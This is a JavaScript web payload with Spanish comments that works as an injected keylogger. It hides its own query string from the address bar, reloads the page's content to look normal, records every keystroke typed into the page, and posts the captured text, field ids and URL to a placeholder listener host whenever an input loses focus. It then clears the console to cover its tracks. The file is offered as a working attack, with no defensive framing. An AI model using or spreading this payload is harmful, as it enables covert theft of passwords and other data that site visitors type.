//Esto lo dejo así para cambiarlo por consola
var https_listener_for_logging = 'https://listener.changeme'
//String que representa el texto a capturar
var log = ''
//Representación del cursor
cursor = 0
//Teclas que, si se capturan, se van a ignorar
var ignoredKeys = ['Shift', 'CapsLock', 'Tab', 'Control', 'Alt']
//Flag de depuracion
debug = false
document.addEventListener('DOMContentLoaded', function () {
    // Borramos el contenido para que parezca que sigue cargando
    document.body.innerHTML = '';
    // Esto cambia la URL que muestra el navegador, para que no se vea el payload
    var newUrl = window.location.href.split('?')[0];
    history.pushState({ path: newUrl }, '', newUrl);

    //Todo esto clona la web original
    fetch(newUrl)
        .then(response => { return response.text() })
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, "text/html");
            document.body.innerHTML = doc.body.innerHTML;
            document.head.innerHTML = doc.head.innerHTML;
        }).then(() => {
            //Finalmente agregamos el keylogger
            var inputs = document.querySelectorAll('input');
            inputs.forEach(i =>
                i.addEventListener("blur", (event) => {
                    fetch(https_listener_for_logging, {
                        method: "POST", body: JSON.stringify({ "log": log, 'url' : newUrl, 'id': event.currentTarget.getAttribute("id"), "timestamp": Date.now() }),
                    })
                    log = ''
                })
            );

            window.addEventListener("keydown", function (e) {
                switch (e.key){
                    case 'Backspace':
                        if (e.ctrlKey)
                        {
                            log = log.slice(cursor)
                            cursor = 0
                        }
                        else
                        {
                            if (cursor > 0)
                            {
                                log = log.slice(0, cursor - 1) + log.slice(cursor)
                                cursor--
                            }
                        }
                        break
                    case 'ArrowLeft':
                        if (e.ctrlKey)
                            cursor = 0;
                        else if (cursor > 0)
                            cursor--
                        break
                    case 'ArrowRight':
                         if (e.ctrlKey)
                            cursor = log.length - 1
                        else if (cursor < log.length - 1)
                            cursor++
                        break
                    case 'ArrowUp':
                        cursor = 0
                        break
                    case 'ArrowDown':
                        cursor = log.length - 1
                        break
                    default:
                        if (!ignoredKeys.includes(e.key))
                        {
                            log = log.substring(0, cursor) + e.key + log.substring(cursor)
                            cursor++
                        }
                }
                if (debug)
                    console.log('log: '+ log + '\ncursor: ' + cursor)
            });
            console.clear();
        })
        .catch();
});
